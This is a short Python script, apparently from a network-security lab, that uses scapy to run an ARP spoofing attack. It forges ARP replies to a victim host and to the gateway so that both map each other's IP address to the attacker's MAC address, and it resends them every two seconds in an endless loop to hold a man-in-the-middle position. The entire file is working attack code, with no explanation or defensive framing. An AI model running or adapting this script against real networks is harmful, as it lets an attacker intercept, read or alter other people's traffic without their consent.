from scapy.all import *
import time

victim_ip = "10.0.2.5"
victim_mac = "08:00:27:a9:b3:5b"
gateway_ip = "10.0.2.1"
gateway_mac = "52:55:0A:00:02:01"
attacker_ip = "10.0.2.3"
attacker_mac = "08:00:27:1f:b7:23"


ether_victim = Ether(dst=victim_mac)
arp_victim = ARP(op=2, psrc=gateway_ip, hwsrc=attacker_mac,  pdst=victim_ip, hwdst=victim_mac)
frame_victim = ether_victim/arp_victim

ether_gateway = Ether(dst=gateway_mac)
arp_gateway = ARP(op=2, psrc=victim_ip, hwsrc=attacker_mac, pdst=gateway_ip, hwdst=gateway_mac)
frame_gateway = ether_gateway/arp_gateway


while True:
 sendp(frame_victim)
 sendp(frame_gateway)
 time.sleep(2)
